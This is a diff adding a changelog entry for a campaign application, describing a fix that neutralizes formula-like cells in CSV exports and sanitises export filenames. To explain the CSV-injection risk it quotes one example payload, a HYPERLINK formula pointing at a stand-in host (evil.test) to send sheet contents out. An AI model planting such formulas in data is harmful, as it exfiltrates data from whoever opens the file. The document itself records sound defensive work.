@@ -26,6 +26,24 @@ implementation lifecycle and is independent of the URL version segment.
 
 ## [Unreleased]
 
+### Security — CSV exports can't carry spreadsheet formulas
+- **The campaign export and the campaign recipients CSV neutralize cells that start
+  like a formula** (`=`, `+`, `-`, `@`, a tab or a carriage return) with a leading
+  single quote, which spreadsheets show as text (OWASP "CSV Injection"). Recipient data
+  comes from uploaded CSVs, so a recipient named `=HYPERLINK("https://evil.test/?"&A1,…)`
+  would have become a live formula for whoever opened the export, able to send the
+  sheet's contents elsewhere. Column names too, and the other analytics CSVs go through
+  the same writer (`spreadsheet_safe`, `server/utils/csv_export.py`).
+- **An export uploaded back as a campaign keeps its data:** the CSV import drops that
+  quote again. A phone number like `+34 600…` also gets the quote in an export; that's
+  the usual trade-off.
+- **Any campaign name exports.** The download's filename came from the campaign's name
+  as it was: a name outside latin-1 (`Q4 🚀`, `东京`) made the export fail with a 500,
+  and quotes, CR/LF or slashes went into the `Content-Disposition` header. Every CSV now
+  sends a plain ASCII `filename` and the real name in `filename*` (RFC 6266/5987,
+  `content_disposition`), which browsers prefer. The response isn't cached
+  (`Cache-Control: no-store`), like the other CSVs.
+
 ### Security — the frontend's markup, audited (Phase 6.3)
 - **Every raw `innerHTML` that carried data now goes through the escaping `html` tag and
   `setHTML`**: toasts, confirm dialogs, form alerts, the tag picker, charts and their
